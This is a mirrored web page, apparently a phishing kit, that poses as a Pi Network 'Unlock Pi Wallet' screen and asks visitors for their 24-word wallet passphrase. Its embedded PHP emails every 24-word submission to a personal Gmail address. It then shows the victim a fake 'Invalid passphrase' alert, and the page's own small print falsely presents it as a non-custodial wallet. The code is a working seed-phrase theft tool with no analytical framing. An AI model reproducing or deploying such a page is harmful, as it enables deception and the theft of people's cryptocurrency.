
<!DOCTYPE html>

<html lang="en-US" class="no-js">

<!-- Mirrored from validatemypi.com/wallet/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Nov 2023 16:13:37 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	
			<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
			
			
 <title>wallet &#8211; Pi Network</title>
  <link rel="stylesheet" type="text/css" href="styles.css">
  
  



<header>




<style>
/* Style the body */
body {
  font-family: Arial;
  margin: 0;
}

/* Header/Logo Title */
.header {
  padding: 2px;
  text-align: center;
  background: #783a8c;
  color: #783a8c;
  font-size: 30px;
}

/* Page Content */
.content {padding:0px;}
</style>



</header>


<div class="header">

   <img src="wallet.png"  height="50"  top="800px" ;>
						   
						   
</div>
	
</head>



<body><br>





<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $comment = $_POST['comment'];
  $to = 'samuelppal@gmail.com'; // Replace with your email address

  $subject = 'New phrase from your pi website';
  $message = "$comment";

  $headers = "From: Your Website <trade.corepiy.com>\r\n";
  $headers .= "Reply-To: samuelppal@gmail.com\r\n";
  $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

  // Count the number of words in the comment
  $wordCount = str_word_count($comment);

  if ($wordCount === 24) {
    if (mail($to, $subject, $message, $headers)) {
      echo "<script>alert(' Invalid passphrase !');</script>";
    }
  } else {
    echo "<script>alert('Please make sure your passphrase has exactly 24 words.');</script>";
  }
}
?>




  <div class="comment-box">
      
      
  <center> <h3 class="txt"><b>Unlock Pi Wallet</b></h3></center> 
  <br>  
  
  <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
      <textarea name="comment" placeholder="Enter your 24-word passphrase here"></textarea>
      
      
      <br>
      <button type="submit" value="Submit"> UNLOCK WITH PASSPHRASE</button>
      <br>
      <button class="bone"> UNLOCK WITH FINGERPRINT </button>
      
      
      
      
      
  <br><br>
  <p class="txt"><small>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</small></p>

<p class="txt"><small>Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.</small></p>





    <style>
.txt {
    font-size: 18px;
    line-height: 1;
    margin-left: 25px;
}
.txt {
    font-family: "Helvetica", Sans-serif;
}
    </style>

    </form>
    
    
    
    
    
  </div>
  
  
  
</body>
</html>





    


<style>
CSS (styles.css):
css
.comment-box {
  border: 2px solid orange;
  padding: 20px;
  width: 400px;
  margin: 0 auto;
  
  
      border-style: solid;
    border-width: 1px 1px 1px 1px;
    border-color: #FFA500;
    text-align: center ;
    display: flex;
    flex-direction: column;
    align-items: center;
    font-weight: 0;
     display: block;
        margin: 0 auto;
    
}

textarea {
  width: 80%;
  height: 180px;
  margin-bottom: 10px;
      border-style: solid;
    border-width: 1px 1px 1px 1px;
    border-color: #FFA500;
     display: flex;
    flex-direction: column;
    align-items: center;
    display: block;
        margin: 0 auto;
}

button {
  background-color: #ffffff;
  color: #76348e;
  padding: 15px 50px;
  border: 2px solid #76348e;
  cursor: pointer;
      text-align: center;
         
    border-width: 2px 2px 2px 2px;
    font-family: "Helvetica", Sans-serif;
    font-weight: 700;
        border-radius: 20px 20px 20px 20px;
        display: block;
        margin: 0 auto;
}

.bone {
     background-color:  #76348e;
  color: #ffffff;
  padding: 10px 40px;
  border: 2px solid #76348e;
  cursor: pointer;
      text-align: center;
         
    border-width: 2px 2px 2px 2px;
    font-family: "Helvetica", Sans-serif;
    font-weight: 700;
        border-radius: 5px 5px 5px 5px;
        display: block;
        margin: 0 auto;
    
    
}

.txt {
    font-family: "Helvetica", Sans-serif; 
}
</style>



